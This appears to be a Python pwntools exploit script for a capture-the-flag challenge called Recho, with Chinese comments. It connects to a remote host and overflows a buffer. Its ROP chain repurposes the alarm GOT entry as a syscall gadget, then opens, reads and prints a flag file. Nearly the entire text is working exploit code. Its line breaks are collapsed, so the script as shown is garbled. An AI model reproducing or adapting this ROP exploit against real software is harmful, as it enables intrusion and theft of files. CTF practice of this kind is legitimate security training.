#coding:utf8from pwn import *import timecontext.log_level = 'debug'#sh = process('./pwn')sh = remote('111.200.241.244',56790)elf = ELF('./pwn')#用于传参'''''pop raxretn'''pop_rax = 0x4006FC'''''pop rdxretn'''pop_rdx = 0x4006FE'''''pop rsipop r15retn'''pop_rsi = 0x4008A1'''''pop rdiretn'''pop_rdi = 0x4008A3'''''add [rdi],alretn'''rdi_add = 0x40070d#bss 段的 stdin 缓冲区，我们可以把数据存在这里stdin_buffer = 0x601070alarm_got = elf.got['alarm']alarm_plt = elf.plt['alarm']read_plt = elf.plt['read']printf_plt = elf.plt['printf']sh.recvuntil('Welcome to Recho server!\n')sh.sendline(str(0x200))payload = b'a'*0x38#######修改 alarm 的 GOT 表内容为 alarm 函数里的 syscall 调用处地址###########rdi = alarm_gotpayload += p64(pop_rdi) + p64(alarm_got)#rax = 0x5payload += p64(pop_rax) + p64(0x5)#[rdi] = [rdi] + 0xE = alarm 函数里的 syscall 的调用处payload += p64(rdi_add)########'''''fd = open('flag',READONLY)'''# rsi = 0 (READONLY)payload += p64(pop_rsi) + p64(0) + p64(0)#rdi = 'flag'payload += p64(pop_rdi) + p64(next(elf.search(b'flag')))#rax = 2,open 的调用号为 2，通过调试即可知道payload += p64(pop_rax) + p64(2)#syscallpayload += p64(alarm_plt)''''' read(fd,stdin_buffer,100) '''#rdi 指向 buf 区，用于存放读取的结果payload += p64(pop_rsi) + p64(stdin_buffer) + p64(0)#open()打开文件返回的文件描述符一般从 3 开始，依次顺序增加payload += p64(pop_rdi) + p64(3)# rax = 100，最多读取 100 个字符payload += p64(pop_rdx) + p64(100)#指向 read 函数payload += p64(read_plt)#使用 printf 打印读取的内容payload += p64(pop_rdi) + p64(stdin_buffer) + p64(printf_plt)#这步也关键，尽量使字符串长，这样才能将我们的 payload 全部输进去，不然可能因为会有缓存的问题导致覆盖不完整payload = payload.ljust(0x200,b'\x00')sh.sendline(payload)#关闭输入流，就可以退出那个循环，执行 ROP 了sh.shutdown('write')sh.interactive()